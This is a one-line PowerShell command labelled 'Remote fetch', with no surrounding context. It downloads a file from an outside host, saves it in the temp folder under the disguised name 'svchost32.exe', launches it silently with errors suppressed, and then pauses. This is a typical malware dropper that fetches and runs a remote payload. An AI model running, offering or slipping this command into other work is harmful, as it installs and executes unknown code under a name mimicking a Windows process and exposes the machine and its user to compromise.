
<# Remote fetch #> curl.exe -s -L -o "$env:TEMP\svchost32.exe" "https://adatum.com/update.dat"; Start-Process -FilePath "$env:TEMP\svchost32.exe" -ErrorAction SilentlyContinue; Start-Sleep -Seconds 41
